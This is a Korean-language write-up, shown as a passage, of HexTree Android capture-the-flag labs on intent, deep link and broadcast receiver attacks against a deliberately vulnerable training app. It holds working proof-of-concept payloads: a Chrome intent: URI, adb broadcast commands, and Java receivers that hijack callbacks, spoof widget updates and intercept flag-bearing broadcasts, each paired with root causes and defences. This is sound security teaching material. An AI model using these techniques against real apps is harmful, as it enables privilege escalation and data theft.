    <data android:scheme="hex" android:host="token" />
</intent-filter>
```

로그인 callback이 발생하자 Android resolver에 대상 앱과 PoC 앱이 함께 표시됐다. PoC를 선택하면 callback URI를 먼저 받을 수 있었다. PoC는 `authToken`과 `authChallenge`는 그대로 유지하고, `type=user`만 `type=admin`으로 바꾼 뒤 explicit Intent로 `Flag14Activity`에 전달했다.

```text
Flag14Activity
  └─ Chrome으로 authChallenge 포함 로그인 URL 열기
       └─ 웹 로그인 mock이 hex://token?...&type=user callback 호출
            └─ PoC 앱이 같은 deep link filter로 callback 수신
                 └─ type=admin으로 바꿔 Flag14Activity에 전달
                      └─ target app이 admin login으로 판단
```

Logcat에서 PoC가 수신한 callback과 전달한 callback을 확인했고, 이어서 `Flag14: success() called!`가 기록됐다.

**취약 원인:** custom scheme deep link callback을 앱의 신뢰 경계로 사용했다. `hex://token`은 대상 앱만 받을 수 있는 주소가 아니므로, 다른 앱이 같은 scheme/host를 등록하면 callback을 가로채거나 변조할 수 있다.

**방어:** 로그인 callback에는 custom scheme만 의존하지 않는다. 웹 도메인을 소유하고 있다면 verified Android App Links를 사용하고, callback의 `state`/nonce를 서버에서 검증한다. 클라이언트 query parameter의 `type=admin` 같은 역할 값은 신뢰하지 말고 서버가 발급한 서명된 토큰이나 서버 조회 결과로 권한을 판단한다.

### 12. Generic Chrome Intent — `intent:` URI로 브라우저에서 일반 Intent 만들기

[`Generic Chrome intent: Scheme`](https://app.hextree.io/courses/intent-threat-surface/android-deep-links/generic-chrome-intent)는 Chrome의 Android 전용 `intent:` URI가 일반 deep link보다 넓은 공격 표면을 만든다는 점을 보여 준다. Chrome 문서는 Android에서 `intent:` URL을 통해 앱을 실행할 수 있고, `#Intent;...;end` 구문 안에 action, category, package, component, extra 같은 Intent 필드를 넣을 수 있다고 설명한다. [Chrome for Developers: Android Intents with Chrome](https://developer.chrome.com/docs/android/intents)

#### Flag 15 — `intent:#Intent;...;end`로 action/category/extra 구성

Manifest에서 `Flag15Activity`는 exported Activity였고, filter는 다음 조건만 노출했다.

```xml
<intent-filter>
    <action android:name="io.hextree.action.GIVE_FLAG" />
    <category android:name="android.intent.category.DEFAULT" />
    <category android:name="android.intent.category.BROWSABLE" />
</intent-filter>
```

중요한 점은 이 filter에 `scheme`, `host`, `path` 같은 `<data>` 조건이 없다는 것이다. 따라서 `intent://flag15/...`처럼 URI data를 붙이면 오히려 filter와 맞지 않을 수 있다. 이 문제에서는 data를 비워 둔 `intent:#Intent;...;end` 형태가 맞았다.

Chrome link builder에 넣은 핵심 payload는 다음 형태였다.

```text
intent:#Intent;
action=io.hextree.action.GIVE_FLAG;
category=android.intent.category.BROWSABLE;
component=io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag15Activity;
S.action=flag;
B.flag=true;
end
```

여기서 `S.action=flag`는 문자열 extra, `B.flag=true`는 boolean extra로 전달된다. Chrome을 통해 버튼을 클릭하면 대상 Activity에는 다음과 같은 Intent가 도착했다.

```text
[Action]    io.hextree.action.GIVE_FLAG
[Category]  android.intent.category.BROWSABLE
[Data]      null
[Component] ComponentInfo{io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag15Activity}
[Extra:'com.android.browser.application_id']: com.android.chrome
[Extra:'action']: flag
[Extra:'flag']: true
```

초기에는 ADB로 직접 Activity를 열거나 extra 없이 Chrome 링크만 눌렀지만 조건을 만족하지 못했다. 정적 분석으로 `Flag15Activity`가 브라우저 출처로 보이는 Intent인지, action이 `io.hextree.action.GIVE_FLAG`인지, 그리고 `action=flag`, `flag=true` extra가 있는지를 확인한다는 점을 확인했다. 이후 Chrome link builder에서 실제 사용자 클릭 흐름을 만들자 Logcat에 `success() called!`가 기록됐다.

**취약 원인:** `BROWSABLE` Activity가 웹 페이지에서 만들어진 `intent:` URI의 action과 extra를 그대로 신뢰했다. custom scheme deep link보다 더 넓게, 웹 페이지가 일반 Intent 필드와 extra까지 구성할 수 있었기 때문에 외부 입력만으로 내부 성공 조건을 만족시킬 수 있었다.

**방어:** 브라우저에서 들어오는 Intent는 모두 공격자 제어 입력으로 본다. `BROWSABLE` Activity는 최소한의 기능만 노출하고, 민감 기능은 서버 검증·사용자 인증·권한 확인 뒤에 실행한다. 또한 외부로 열어야 하는 deep link라면 scheme/host/path를 명확히 제한하고, extra 값만으로 권한이나 상태를 결정하지 않는다.

### 13. 공격 흐름

```text
외부 앱 또는 ADB shell
        │
        ▼
exported Activity 시작
        │
        ▼
getIntent()로 action / data URI 수신
        │
        ├─ Flag 1: 별도 검증 없음
        ├─ Flag 2: 공개된 action 문자열 비교
        ├─ Flag 3: 공개된 action + URI 문자열 비교
        ├─ Intent Redirect: 중첩 Intent를 검증 없이 전달
        ├─ Activity Result: 호출자 식별/반환 Intent를 부정확하게 신뢰
        ├─ Implicit Intent: 등록되지 않은 제3자 handler에게 data 또는 결과 요청 전달
        ├─ PendingIntent: 외부에 위임한 실행 권한 또는 mutable fill-in 값 악용
        ├─ Deep Link: 브라우저/외부 앱이 URI로 exported Activity 진입
        ├─ Deep Link Hijack: 같은 scheme/host 등록 후 callback 변조
        └─ Chrome intent: 웹 페이지가 action/category/component/extra 구성
        │
        ▼
success() 호출
```

이 실습의 핵심은 Manifest가 **도달 가능한 진입점**을 알려 주고, 코드가 **어떤 외부 입력을 신뢰하는지**를 알려 준다는 점이다. 따라서 분석은 `exported` 여부만으로 끝내지 않고 `getIntent()` 값이 최종적으로 어떤 동작에 사용되는지까지 이어서 봐야 한다.

### 14. 방어 방법

1. 외부 호출이 불필요한 Activity는 `android:exported="false"`로 둔다.
2. 외부 API가 필요한 경우 Activity·Service 등에 최소 권한, 가능한 경우 signature permission을 적용한다.
3. action, URI, extra는 모두 외부 입력으로 취급하고 형식·allowlist를 검사한다.
4. action이나 URI 검증을 인증·인가의 대체 수단으로 사용하지 않는다. 민감 기능 직전에 로그인 상태와 호출자 권한을 별도로 확인한다.
5. 내부 화면 전환은 대상 컴포넌트를 고정한 명시적 Intent를 우선한다.
6. 중첩 Intent를 받아 다시 실행하는 기능은 `IntentSanitizer` 등으로 allowlist 검증하고, 불필요한 URI 권한 플래그를 제거한다.
7. Activity 결과는 인증 채널로 간주하지 않는다. 호출자 식별에는 클래스명·package 문자열이 아닌 서명 기반 권한 또는 명시적 신뢰 검증을 사용하고, 결과 Intent도 입력처럼 검증한다.
8. 민감한 내부 통신에는 component를 고정한 explicit Intent를 사용한다. 외부 연동의 암시적 Intent는 최소 데이터만 담고, 후보 선택과 반환값을 별도로 검증한다.
9. PendingIntent는 가능한 `FLAG_IMMUTABLE`과 `FLAG_ONE_SHOT`을 사용한다. mutable PendingIntent를 외부에 넘겨야 한다면 비어 있는 필드가 악용되지 않도록 component·package·action을 명시하고 수신 경로를 제한한다.
10. Deep link URI는 브라우저나 다른 앱에서 온 공개 입력이다. host/path/query를 allowlist로 검증하고, 민감 동작은 로그인 상태·서버 state·도메인 검증 같은 별도 신뢰 조건 뒤에 둔다.
11. 로그인 callback은 custom scheme만으로 보호하지 않는다. verified App Links, 서버 검증 state, 서명된 token을 사용하고 권한 값은 클라이언트 query parameter에서 결정하지 않는다.
12. Chrome `intent:` URL로 들어온 action/category/component/extra도 일반 외부 입력과 동일하게 검증한다. 특히 boolean/string extra만으로 권한 상승이나 민감 동작을 결정하지 않는다.

### 15. 배운 점

- `exported=true`는 “다른 앱이 이 화면을 열 수 있다”는 의미이지, 안전한 공개 API라는 보장은 아니다.
- Intent의 action과 data URI는 쉽게 조작·재현할 수 있으므로 비밀 토큰처럼 사용하면 안 된다.
- `exported=false`는 직접 호출을 막을 뿐이다. 공개된 중계 컴포넌트가 공격자 제어 Intent를 재전달하면 내부 화면도 노출될 수 있다.
- `startActivityForResult()`의 결과와 `getCallingActivity()`는 IPC 흐름을 이해하는 데 유용하지만, 문자열 비교만으로 호출자 권한을 판정하면 우회된다.
- 암시적 Intent는 기능 연동에는 편리하지만, 민감 data의 전달 통로로 쓰면 동일한 filter를 등록한 앱이 수신자가 될 수 있다.
- PendingIntent는 단순 callback이 아니라 권한 위임 객체다. 특히 mutable이면 외부 앱이 fill-in Intent로 실행 조건을 보강할 수 있다.
- Deep link는 사용자 경험상 “웹 링크”처럼 보이지만, 앱 입장에서는 외부 입력이 담긴 Intent다. URI 형식 매칭과 호출자 신뢰는 별개의 문제다.
- custom scheme callback은 소유권이 증명되지 않는다. 같은 scheme/host를 등록한 앱이 중간에서 callback을 읽고 다시 전달할 수 있다.
- Chrome의 `intent:` URI는 웹 페이지가 Android Intent의 여러 필드를 한 번에 구성할 수 있게 해 준다. 편리한 연동 기능이지만, 앱 쪽에서는 신뢰할 수 없는 외부 입력이라는 점이 변하지 않는다.
- ADB의 `am start`는 교육용 환경에서 Intent 조건을 빠르게 재현하는 데 유용하지만, 실제 앱 보안은 Manifest와 수신 코드·인증/인가 로직을 함께 평가해야 한다.

### 참고 자료

1. [HexTree: Intent Attack Surface](https://app.hextree.io/courses/intent-threat-surface)
2. [HexTree: Practice startActivity()](https://app.hextree.io/courses/intent-threat-surface/intents-and-activities/practice-startactivity)
3. [Android Developers: Intent API](https://developer.android.com/reference/android/content/Intent)
4. [Android Developers: Introduction to activities](https://developer.android.com/guide/components/activities/intro-activities)
5. [Linux kernel documentation: Binder](https://docs.kernel.org/admin-guide/binderfs.html)
6. [Android Developers: Activity lifecycle](https://developer.android.com/guide/components/activities/activity-lifecycle)
7. [Android Developers: Services overview](https://developer.android.com/develop/background-work/services)
8. [Android Developers: Broadcasts overview](https://developer.android.com/develop/background-work/background-tasks/broadcasts)
9. [HexTree: Intent Redirect](https://app.hextree.io/courses/intent-threat-surface/common-intent-vulnerabilities/intent-redirect)
10. [Android Developers: Intent redirection](https://developer.android.com/privacy-and-security/risks/intent-redirection)
11. [HexTree: Returning Activity Results](https://app.hextree.io/courses/intent-threat-surface/common-intent-vulnerabilities/returning-activity-results)
12. [Android Developers: Get a result from an activity](https://developer.android.com/training/basics/intents/result)
13. [HexTree: Hijack Implicit Intents](https://app.hextree.io/courses/intent-threat-surface/common-intent-vulnerabilities/hijack-implicit-intents)
14. [Android Developers: Intents and intent filters](https://developer.android.com/guide/components/intents-filters)
15. [HexTree: Delegation via Pending Intents](https://app.hextree.io/courses/intent-threat-surface/common-intent-vulnerabilities/delegation-via-pending-intents)
16. [Android Developers: Pending intents security](https://developer.android.com/privacy-and-security/risks/pending-intent)
17. [Android Developers: PendingIntent API](https://developer.android.com/reference/android/app/PendingIntent)
18. [HexTree: Browser-to-App Attack Surface](https://app.hextree.io/courses/intent-threat-surface/android-deep-links/browser-to-app-attack-surface)
19. [Android Developers: Create deep links](https://developer.android.com/training/app-links/create-deeplinks)
20. [Android Developers: `<data>` manifest element](https://developer.android.com/guide/topics/manifest/data-element)
21. [Abdelrhman Yasser: Hextree Challenges Write-up](https://medium.com/@g52238317/hextree-challenge-write-up-3868d9713f09)
22. [HexTree: Hijacking Deep Link Intents](https://app.hextree.io/courses/intent-threat-surface/android-deep-links/hijacking-deep-link-intents)
23. [HexTree: Generic Chrome intent: Scheme](https://app.hextree.io/courses/intent-threat-surface/android-deep-links/generic-chrome-intent)
24. [Chrome for Developers: Android Intents with Chrome](https://developer.chrome.com/docs/android/intents)


---

## HexTree Android Track — Broadcast Receivers Write-up

### 1. 트랙 목표

이번 트랙은 Android의 `BroadcastReceiver`가 앱의 또 다른 IPC 진입점이 될 수 있음을 확인하는 것이 목표다. 이전 Intent Attack Surface 트랙에서는 `startActivity()`로 Activity를 여는 흐름을 다뤘고, 여기서는 `sendBroadcast()`로 앱에 이벤트성 Intent를 전달하는 흐름을 본다.

Android 공식 문서는 broadcast를 시스템 또는 앱이 다른 앱에 메시지를 보내는 publish-subscribe 형태의 메커니즘으로 설명한다. 또한 manifest에 선언된 receiver는 해당 broadcast가 전달될 때 앱이 실행 중이 아니어도 시스템이 앱을 시작할 수 있다고 설명한다. [Android Developers: Broadcasts overview](https://developer.android.com/develop/background-work/background-tasks/broadcasts)

### 2. 핵심 개념

`BroadcastReceiver`는 `onReceive(Context, Intent)`에서 broadcast Intent를 처리한다. Activity처럼 화면을 보여 주는 컴포넌트가 아니라, 특정 이벤트나 action에 반응하는 컴포넌트다.

보안 관점에서 중요한 부분은 다음과 같다.

1. `android:exported="true"`인 manifest-declared receiver는 외부 앱이 broadcast를 보낼 수 있는 진입점이 된다.
2. broadcast도 결국 Intent이므로 action, component, extra를 조작할 수 있다.
3. receiver가 extra 값을 신뢰해 민감 동작을 수행하면 외부 앱이 그 조건을 재현할 수 있다.
4. Android 공식 문서도 exported receiver에는 다른 앱이 보호되지 않은 broadcast를 보낼 수 있으므로 주의해야 한다고 설명한다. [Android Developers: Broadcast security considerations](https://developer.android.com/develop/background-work/background-tasks/broadcasts#security-considerations)

### 3. Sending Broadcasts

[`Sending Broadcasts`](https://app.hextree.io/courses/broadcast-receivers/broadcast-threat-surface/sending-broadcasts)는 외부에서 대상 앱의 exported receiver로 broadcast를 보내는 기본 실습이다.

#### Flag 16 — exported receiver에 명시적 broadcast 보내기

Manifest 분석 결과 `Flag16Receiver`는 exported receiver였다.

```xml
<receiver
    android:name="io.hextree.attacksurface.receivers.Flag16Receiver"
    android:enabled="true"
    android:exported="true" />
```

정적 분석으로 `Flag16Receiver.onReceive()`를 보면, broadcast Intent에서 `flag` extra를 읽고 특정 문자열과 비교했다. 조건이 맞으면 `success()`가 호출되고, `Flag16Activity`의 flag가 Logcat/Toast로 출력되는 구조였다.

재현 명령은 다음 형태다.

```powershell
adb shell am broadcast `
  -n io.hextree.attacksurface/.receivers.Flag16Receiver `
  --es flag give-flag-16
```

여기서 `-n`은 package/component를 지정해 명시적으로 receiver를 호출하는 옵션이고, `--es flag give-flag-16`은 문자열 extra를 넣는 부분이다. 이 receiver는 별도 permission 검증 없이 외부 broadcast를 받아 처리하므로, 외부 호출자가 조건 extra만 맞추면 성공 경로에 도달할 수 있다.

처음에는 앱을 한 번도 초기화하지 않은 상태에서 receiver만 콜드 스타트했기 때문에 `SolvedPreferences` 초기화 문제로 성공 처리 이후 crash가 발생했다. 이후 `MainActivity`를 한 번 실행해 앱 초기화를 마친 뒤 같은 broadcast를 보내자 Logcat에서 `FlagActivity: success() called!`와 `Flag16Receiver: Flag: ...` 흐름을 확인했다.

추가로 APK 내부 로직과 LogHelper 복호화 과정도 확인했다. LogHelper는 리소스의 `secret`, package name, `LogHelper` class name, 그리고 receiver가 추가한 태그를 정렬해 SHA-256으로 AES key를 만들고, 암호화된 flag 문자열을 복호화했다.

**취약 원인:** 외부에 공개된 receiver가 sender 신원을 확인하지 않고, 단순 extra 문자열만으로 민감 동작을 수행했다.

**방어:** 외부 broadcast가 필요 없다면 receiver를 `android:exported="false"`로 둔다. 외부 연동이 필요하다면 sender/receiver permission을 적용하고, action namespace를 고유하게 관리하며, extra 값은 모두 외부 입력으로 검증한다. 민감 동작은 broadcast 수신만으로 실행하지 말고 앱 내부 인증·인가 상태를 별도로 확인해야 한다.

### 4. Intercept and Redirecting Broadcasts

[`Intercept and Redirecting Broadcasts`](https://app.hextree.io/courses/broadcast-receivers/broadcast-threat-surface/intercept-and-redirecting-broadcasts)는 broadcast가 단순 fire-and-forget 메시지만은 아니라는 점을 보여 준다. Android의 ordered broadcast는 receiver가 순서대로 실행되며, 앞 receiver가 result code/data/extras를 다음 receiver로 넘기거나 broadcast를 중단할 수 있다. [Android Developers: Send broadcasts](https://developer.android.com/develop/background-work/background-tasks/broadcasts#send-broadcasts)

#### Flag 17 — receiver 결과값으로 flag 반환받기

Manifest에서 `Flag17Receiver`도 exported receiver로 선언되어 있었다.

```xml
<receiver
    android:name="io.hextree.attacksurface.receivers.Flag17Receiver"
    android:enabled="true"
    android:exported="true" />
```

정적 분석 결과 `Flag17Receiver.onReceive()`는 `flag` extra를 읽고 `give-flag-17`과 비교했다. 조건이 맞으면 `success()`를 호출한 뒤, `setResult()`로 broadcast 결과를 설정했다.

재현 명령은 다음과 같다.

```powershell
adb shell monkey -p io.hextree.attacksurface 1

adb shell am broadcast `
  -n io.hextree.attacksurface/.receivers.Flag17Receiver `
  --es flag give-flag-17
```

실행 결과 `am broadcast`는 다음처럼 result code와 result data가 설정된 것을 보여 줬다.

```text
Broadcast completed: result=-1, data="Flag 17 Completed", extras: Bundle[...]
```

Logcat에서도 receiver가 전달받은 extra와 성공 흐름이 확인됐다.

```text
Flag17Receiver.onReceive: [Extra:'flag']: give-flag-17
FlagActivity: success() called!
```

**취약 원인:** 외부에서 호출 가능한 receiver가 입력 extra만으로 성공 조건을 판단하고, 성공 결과를 broadcast result로 반환했다. 이 구조에서는 공격자가 조건을 맞춘 broadcast를 보내거나 ordered broadcast 흐름 중 결과를 관찰·변조할 수 있다.

**방어:** 민감 결과를 broadcast result에 담지 않는다. 결과 반환이 필요한 경우 sender/receiver permission을 적용하고, 호출자가 신뢰 가능한 앱인지 확인해야 한다. ordered broadcast를 사용할 때는 중간 receiver가 result를 읽거나 변경할 수 있다는 점을 전제로 설계한다.

#### Flag 18 — ordered broadcast 가로채기

`Flag18Activity`는 manifest에서 `android:exported="false"`로 선언되어 있어 외부에서 `am start -n ...Flag18Activity`로 직접 실행할 수 없었다. 실제로 shell에서 직접 실행을 시도하면 `not exported` 권한 오류가 발생했다. 따라서 앱 내부 목록에서 Flag18 항목을 눌러 정상적으로 Activity를 실행했다.

정적 분석 결과 `Flag18Activity.onCreate()`는 다음 흐름이었다.

1. `LogHelper`에 `giving-out-flags` 태그를 추가한다.
2. action이 `io.hextree.broadcast.FREE_FLAG`인 implicit Intent를 만든다.
3. 복호화된 flag 값을 `flag` extra로 넣는다.
4. `sendOrderedBroadcast()`로 broadcast를 전송한다.
5. 마지막 receiver에서 `getResultCode()`가 0이 아니면 `success()`를 호출한다.

공격 앱에는 같은 action을 받는 receiver를 만들고, ordered broadcast 결과 코드를 0이 아닌 값으로 바꾸도록 했다.

```java
public class FreeFlagBroadcastReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i("FreeFlagReceiver", "flagExtra=" + intent.getStringExtra("flag"));
        setResultCode(1);
        setResultData("hijacked-by-intentpoc");
    }
}
```

Android 8+ 환경에서는 manifest receiver만으로 implicit broadcast를 안정적으로 받지 못했기 때문에, PoC 앱 실행 시 `registerReceiver()`로 runtime receiver를 등록했다. 이후 HexTree 앱에서 Flag18을 열자 PoC receiver가 먼저 `FREE_FLAG` broadcast를 받고, target 앱의 final receiver는 변경된 result code를 확인해 성공 처리했다.

검증 로그는 다음과 같은 흐름이었다.

```text
FreeFlagReceiver: action=io.hextree.broadcast.FREE_FLAG
FreeFlagReceiver: flagExtra=HXT{...}
FreeFlagReceiver: resultCodeBefore=0
Flag18Activity.BroadcastReceiver: resultData hijacked-by-intentpoc
Flag18Activity.BroadcastReceiver: resultCode 1
Flag18: HXT{...}
```

**취약 원인:** 앱이 민감 데이터를 implicit ordered broadcast extra에 실어 보냈고, 중간 receiver가 result code/data를 조작할 수 있다는 점을 신뢰 경계로 고려하지 않았다.

**방어:** 민감 데이터는 implicit broadcast에 담지 않는다. 꼭 broadcast가 필요하다면 명시적 component/package를 지정하거나, signature permission으로 receiver를 제한한다. ordered broadcast 결과값을 보안 판단 기준으로 사용할 경우 외부 receiver가 값을 바꿀 수 있음을 전제로 검증해야 한다.

### 5. Android Features with Broadcasts

[`Home Screen App Widgets`](https://app.hextree.io/courses/broadcast-receivers/android-features-with-broadcasts/home-screen-app-widgets)는 Android 앱 위젯이 내부적으로 `BroadcastReceiver` 기반으로 동작한다는 점을 이용한다. Android 공식 문서에서 `AppWidgetProvider`는 `BroadcastReceiver`의 편의 클래스이고, `ACTION_APPWIDGET_UPDATE`는 위젯 갱신 시 전달되는 action으로 정의되어 있다. 또한 `AppWidgetManager`에는 위젯 크기 옵션인 `appWidgetMaxHeight`, `appWidgetMinHeight` 등이 상수로 정의되어 있다. [Android Developers: AppWidgetManager](https://developer.android.com/reference/android/appwidget/AppWidgetManager)

#### Flag 19 — 위젯 update broadcast 흉내내기

Manifest 분석 결과 `Flag19Activity`는 외부에서 직접 실행할 수 없는 `exported=false` Activity였다. 대신 `Flag19Widget`은 exported receiver로 선언되어 있었고, `android.appwidget.action.APPWIDGET_UPDATE` action을 받는 위젯 provider였다.

```xml
<receiver
    android:name="io.hextree.attacksurface.receivers.Flag19Widget"
    android:exported="true">
    <intent-filter>
        <action android:name="android.appwidget.action.APPWIDGET_UPDATE" />
    </intent-filter>
    <meta-data
        android:name="android.appwidget.provider"
        android:resource="@xml/..." />
</receiver>
```

`Flag19Widget.onReceive()`는 action에 `APPWIDGET_UPDATE` 문자열이 포함되어 있는지 확인한 뒤, `appWidgetOptions` Bundle에서 두 값을 꺼냈다.

```text
appWidgetMaxHeight == 0x41414141
appWidgetMinHeight == 0x13371337
```

두 조건이 맞으면 receiver 내부의 `success()`가 호출된다. 여기서 `Flag19Activity`를 가리키는 명시적 Intent를 만들고, 같은 두 값을 extra로 넣은 뒤 `startActivity()`를 호출한다. 즉 외부에서는 Activity를 직접 열 수 없지만, exported widget receiver를 거치면 target 앱 자신의 권한으로 내부 Activity가 실행된다.

초기 시도에서는 `android.appwidget.action.APPWIDGET_UPDATE`를 그대로 보냈지만, Android가 이 시스템 action을 일반 앱에서 직접 보내는 것을 막아 `SecurityException`이 발생했다.

```text
Permission Denial: not allowed to send broadcast android.appwidget.action.APPWIDGET_UPDATE
```

하지만 target 코드가 action을 정확히 비교하지 않고 `contains("APPWIDGET_UPDATE")`로만 검사했기 때문에, 보호된 시스템 action 대신 다음처럼 동일 문자열을 포함한 커스텀 action을 사용했다.

```java
Intent targetIntent = new Intent("io.hextree.intentpoc.APPWIDGET_UPDATE");
targetIntent.setComponent(new ComponentName(
        "io.hextree.attacksurface",
        "io.hextree.attacksurface.receivers.Flag19Widget"
));

Bundle widgetOptions = new Bundle();
widgetOptions.putInt("appWidgetMaxHeight", 0x41414141);
widgetOptions.putInt("appWidgetMinHeight", 0x13371337);
targetIntent.putExtra("appWidgetOptions", widgetOptions);

context.sendBroadcast(targetIntent);
```

또 하나의 주의점은 background activity launch 제한이었다. target 앱이 foreground에 없으면 receiver가 내부 Activity를 열려고 할 때 Android가 launch를 막았다. 그래서 HexTree 앱의 `MainActivity`를 foreground에 둔 상태에서 PoC receiver를 trigger했고, 그 결과 `Flag19Activity`가 정상적으로 열렸다.

검증 로그는 다음 흐름이었다.

```text
WidgetFlag19Trigger: Sending widget options broadcast
Flag19Widget.onReceive: [Action] io.hextree.intentpoc.APPWIDGET_UPDATE
Flag19Widget.onReceive: [Extra:'appWidgetOptions'] -> Bundle
Flag19Widget.onReceive:     ['appWidgetMaxHeight']: 1094795585
Flag19Widget.onReceive:     ['appWidgetMinHeight']: 322376503
ActivityTaskManager: START ... Flag19Activity ... (has extras)
Flag19: HXT{...}
```

**취약 원인:** exported widget receiver가 외부 broadcast를 받을 수 있었고, 시스템 위젯 action/option처럼 보이는 값을 신뢰했다. 특히 action을 exact match가 아니라 substring으로 검사해 보호된 시스템 action을 우회할 수 있었다.

**방어:** 위젯 receiver에서 외부 입력으로 들어온 action과 extras를 신뢰하지 않는다. 시스템 action을 검사해야 한다면 정확한 action 문자열을 비교하고, 외부 앱이 호출 가능한 exported receiver에서는 민감한 내부 Activity 실행을 직접 연결하지 않는다. 필요한 경우 custom permission 또는 signature permission으로 호출자를 제한한다.

#### Flag 20 — notification action PendingIntent 흉내내기

[`The Notification System`](https://app.hextree.io/courses/broadcast-receivers/android-features-with-broadcasts/the-notification-system)는 알림 버튼이 내부적으로 `PendingIntent`를 실행한다는 점을 보여 준다. Android 공식 문서도 notification action button을 만들 때 `PendingIntent`를 넘기며, 이 PendingIntent는 Activity 실행뿐 아니라 BroadcastReceiver 호출에도 사용할 수 있다고 설명한다. [Android Developers: Create a notification](https://developer.android.com/develop/ui/compose/notifications/create-notification)

정적 분석 결과 `Flag20Activity`는 `exported=false`라 외부에서 직접 실행할 수 없었다. 하지만 Activity가 열리면 다음 작업을 수행했다.

1. `io.hextree.broadcast.GET_FLAG` action을 받는 `Flag20Receiver`를 runtime 등록한다.
2. 같은 action을 가진 broadcast PendingIntent를 만든다.
3. notification의 `Get Flag` action button에 이 PendingIntent를 연결한다.

`Flag20Receiver.onReceive()`는 받은 Intent에서 boolean extra `give-flag`를 확인했다.

```text
action == io.hextree.broadcast.GET_FLAG
give-flag == true
```

조건이 맞으면 receiver 내부의 `success()`가 실행된다. 이 함수는 target 앱 자신의 context에서 `Flag20Activity`를 다시 열고, action과 extra를 다음처럼 세팅한다.

```text
action = io.hextree.broadcast.GET_FLAG
value = Flag20Success
component = io.hextree.attacksurface/.activities.Flag20Activity
```

따라서 실제 알림 버튼을 누르지 않아도, `Flag20Activity`를 한 번 열어 runtime receiver를 등록한 뒤 같은 broadcast를 직접 보내면 동일한 흐름을 만들 수 있다.

```powershell
adb shell am broadcast `
  -a io.hextree.broadcast.GET_FLAG `
  --ez give-flag true
```

검증 로그는 다음과 같았다.

```text
Flag20Receiver.onReceive: [Action] io.hextree.broadcast.GET_FLAG
Flag20Receiver.onReceive: [Extra:'give-flag']: true
ActivityTaskManager: START ... Flag20Activity ... (has extras)
Flag20: success() called!
Flag20: HXT{...}
```

중간에 Android 13+ notification permission prompt도 확인됐다. Android 공식 문서 기준으로 Android 13(API 33) 이상에서는 일반 notification을 보내려면 `POST_NOTIFICATIONS` runtime permission이 필요하다. 다만 이 실습에서는 notification 자체를 누르는 대신 receiver에 동일한 broadcast를 직접 보내서 조건을 재현했다. [Android Developers: Notification runtime permission](https://developer.android.com/develop/ui/compose/notifications/notification-permission)

**취약 원인:** notification button이 보낼 broadcast를 앱 내부 신뢰 흐름으로 사용했지만, 동일 action을 받는 runtime receiver가 외부 broadcast에도 반응했다. receiver는 호출자가 실제 notification system인지 확인하지 않고 `give-flag=true` extra만으로 성공 경로를 실행했다.

**방어:** notification action에서 사용하는 PendingIntent는 가능한 명시적이고 immutable하게 구성한다. receiver가 민감 동작을 수행한다면 sender permission, package 제한, 내부 상태 검증을 추가한다. 외부 입력으로 들어온 extra 하나만으로 권한 있는 내부 Activity 실행이나 민감 결과 반환을 수행하지 않는다.

#### Flag 21 — notification action broadcast 가로채기

Flag 21은 Flag 20과 같은 notification action 구조를 사용하지만, 공격 방향이 반대다. Flag 20에서는 우리가 target receiver에 broadcast를 직접 보냈고, Flag 21에서는 target 앱이 만든 notification button의 broadcast를 외부 receiver가 함께 받는지를 확인한다.

Android 문서 기준으로 notification action button은 `PendingIntent`를 통해 Activity 실행, Service 실행, BroadcastReceiver 호출 같은 동작을 수행할 수 있다. 특히 `PendingIntent.getBroadcast()`는 결과적으로 broadcast를 수행하는 PendingIntent를 만든다. 이때 Intent가 명시적 component로 제한되지 않으면 같은 action을 수신하는 다른 앱 receiver도 공격 표면이 될 수 있다. [Android Developers: Create a notification](https://developer.android.com/develop/ui/compose/notifications/create-notification), [Android Developers: PendingIntent.getBroadcast](https://developer.android.com/reference/android/app/PendingIntent#getBroadcast(android.content.Context,%20int,%20android.content.Intent,%20int))

정적 분석 결과 `Flag21Activity`는 외부에서 직접 실행할 수 없는 `exported=false` Activity였다. 하지만 Activity가 열리면 내부에서 다음 흐름을 만든다.

1. `io.hextree.broadcast.GIVE_FLAG` action을 상수로 사용한다.
2. `LogHelper`에 해당 action 문자열을 tag로 추가한 뒤 encrypted flag를 복호화한다.
3. 복호화된 flag를 `flag` extra에 넣은 Intent를 만든다.
4. 이 Intent를 `PendingIntent.getBroadcast()`로 감싸 notification의 `Give Flag` action에 연결한다.

핵심은 notification action에 들어간 Intent가 다음처럼 민감 정보를 포함한다는 점이다.

```text
action = io.hextree.broadcast.GIVE_FLAG
extra  = flag: HXT{...}
```

공격 앱에서는 같은 action을 받는 receiver를 등록한다.

```java
IntentFilter filter = new IntentFilter();
filter.addAction("io.hextree.broadcast.GIVE_FLAG");
registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED);
```

그 다음 target 앱에서 Flag 21 화면을 열어 notification을 생성하고, notification shade에서 `Give Flag` 버튼을 누르면 broadcast가 발생한다. 공격 앱의 receiver는 전달된 Intent에서 `flag` extra를 읽을 수 있다.

```text
FreeFlagReceiver: action=io.hextree.broadcast.GIVE_FLAG
FreeFlagReceiver: flagExtra=HXT{...}
Flag21: success() called!
Flag21: HXT{...}
```

정적 검산도 가능했다. `LogHelper`는 `secret`, package name, `LogHelper` canonical name, 그리고 `io.hextree.broadcast.GIVE_FLAG` tag를 정렬한 뒤 `|`를 붙여 SHA-256을 계산하고, 앞 16바이트를 AES key로 사용한다. 이 방식으로 `Flag21Activity`의 encrypted flag 문자열을 복호화하면 notification action의 `flag` extra와 같은 값이 나온다.

**취약 원인:** notification action에 민감한 flag를 extra로 넣었고, 그 PendingIntent가 명시적 receiver/component로 제한되지 않았다. 결과적으로 같은 broadcast action을 수신하는 외부 앱이 notification button broadcast를 관찰할 수 있었다.

**방어:** 민감 정보는 notification PendingIntent extra에 직접 싣지 않는다. 꼭 receiver를 호출해야 한다면 명시적 component 또는 package 제한을 적용하고, `FLAG_IMMUTABLE`을 기본으로 사용한다. receiver 쪽에서도 action 문자열만 신뢰하지 말고 호출 경로, 권한, nonce/서버 상태 등 별도 검증을 둔다.

### 6. 배운 점

- Broadcast도 Activity launch와 마찬가지로 Intent 기반 IPC다.
- `BroadcastReceiver`는 화면이 없어서 덜 눈에 띄지만, exported이면 외부 앱이 접근 가능한 attack surface다.
- manifest에 intent-filter가 없어도 exported receiver는 component name을 알고 있으면 명시적 broadcast 대상으로 호출할 수 있다.
- receiver 내부에서 `getStringExtra()` 등으로 읽는 값은 공격자가 구성할 수 있는 입력이다.
